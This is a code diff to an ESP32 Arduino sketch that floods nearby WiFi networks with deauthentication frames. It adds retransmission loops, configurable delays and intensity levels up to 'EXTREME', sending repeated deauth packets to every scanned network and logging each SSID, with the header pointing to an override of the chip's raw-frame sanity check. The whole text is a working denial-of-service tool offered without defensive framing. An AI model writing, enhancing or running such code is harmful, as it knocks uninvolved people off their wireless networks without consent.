@@ -8,14 +8,19 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 // Global variables(initializing the wifi channel to 1 as default)
 int wifi_channel = 1;
 
+int scan_delay = 10; // Value is in milliseconds(1000ms = 1s) can set to 0 for faster rates
+int send_delay = 10; // Value is in milliseconds(1000ms = 1s) can set to 0 for faster rates
+int deauthPacketRetransmissions = 20; // Packet retransmission value[~5-10 LOW | ~20-50 MEDIUM | 50+ HIGH | 100+ EXTREME **ONLY USE WITH PROPER COOLING]
+int retransmissionSessions = 3; // Number of times to repeat the retransmission of the packets
+
 void setup() {
   Serial.begin(115200);
 
-  // Initialize WiFi in STA mode
+  // Initialize WiFi in STA(station) mode
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
 
-  // Enable promiscuous mode if needed (optional for deauth)
+  // Enable promiscuous mode
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
 
@@ -52,9 +57,23 @@ void loop() {
       0x00, 0x00  // Sequence Control
     };
 
-    // Send deauth frame
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), true);
-    Serial.print("Deauth packet sent to network: ");
-    Serial.println(WiFi.SSID(i));
+
+    for (int r = 0; r < retransmissionSessions; ++r) {
+      Serial.print("Starting retransmission session ");
+      Serial.print(r + 1);
+      Serial.print(" to network: ");
+      Serial.println(WiFi.SSID(i));
+
+      // Spam multiple deauth frames to increase effectiveness(Packet Loss Prevention)
+      for (int j = 0; j < deauthPacketRetransmissions; ++j) {
+        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), true);
+        Serial.print("Deauth packet ");
+        Serial.print(j + 1);
+        Serial.print(" sent to network: ");
+        Serial.println(WiFi.SSID(i));
+        delay(send_delay); // Can reduce this further if desired(Prevents Overheating of the chip)
+      }
+    }
   }
+  delay(scan_delay); // delay between scans to prevent constant scanning overload
 }
